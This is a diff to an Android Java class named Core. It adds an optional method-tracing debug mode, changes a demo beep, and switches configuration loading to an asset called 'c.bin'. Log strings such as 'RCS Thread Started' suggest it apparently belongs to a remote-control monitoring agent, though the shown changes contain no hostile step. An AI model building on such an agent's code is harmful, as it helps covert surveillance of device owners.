@@ -164,6 +164,12 @@ public class Core extends Activity implements Runnable {
 	public void run() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
+
+			//startTrace();
+		}
+		
+		if(Cfg.TRACE){
+			startTrace();
 		}
 
 		try {
@@ -210,6 +216,21 @@ public class Core extends Activity implements Runnable {
 			finish();
 			// System.exit(0);
 		}
+	}
+
+	private void startTrace() {
+		Check.log(TAG + " (run): start Method Tracing");
+
+		android.os.Debug.startMethodTracing("networking");
+		Runnable r = new Runnable() {
+			public void run() {
+
+				Check.log(TAG + " (run): stop Method Tracing");
+
+				android.os.Debug.stopMethodTracing();
+			}
+		};
+		Status.self().getDefaultHandler().postDelayed(r, 1000 * 60);
 	}
 
 	private synchronized boolean checkActions() {
@@ -442,12 +463,12 @@ public class Core extends Activity implements Runnable {
 		boolean loaded = false;
 		int ret = ConfType.Error;
 
-		if(Cfg.DEMO){
-			Beep.beepPenta();
+		if (Cfg.DEMO) {
+			Beep.beep();
 		}
-		
+
 		if (Cfg.DEBUG) {
-			
+
 			Check.log(TAG + " (loadConf): TRY NEWCONF");
 		}
 
@@ -489,8 +510,8 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (loadConf): TRY JSONCONF");
 			}
-
-			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 0); // config.bin
+			
+			final byte[] resource = Utils.getAsset("c.bin"); // config.bin
 			String json = new String(resource);
 			// Initialize the configuration object
 
@@ -515,7 +536,7 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (loadConf): TRY RESCONF");
 			}
 			// Open conf from resources and load it into resource
-			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 0); // config.bin
+			final byte[] resource = Utils.getAsset("c.bin"); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
